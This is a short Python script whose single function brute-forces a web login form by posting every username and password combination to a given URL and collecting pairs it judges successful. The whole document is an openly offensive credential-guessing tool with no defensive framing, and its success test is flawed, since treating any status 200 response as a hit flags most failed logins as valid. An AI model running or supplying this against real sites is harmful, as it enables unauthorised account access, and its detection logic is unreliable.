import requests

def brute_force(url, usernames, passwords):
    successful = []
    for user in usernames:
        for pwd in passwords:
            data = {"username": user, "password": pwd}
            try:
                r = requests.post(url, data=data)
                if "dashboard" in r.text.lower() or r.status_code == 200:
                    successful.append((user, pwd))
            except Exception:
                continue
    return successful or "No valid credentials found."
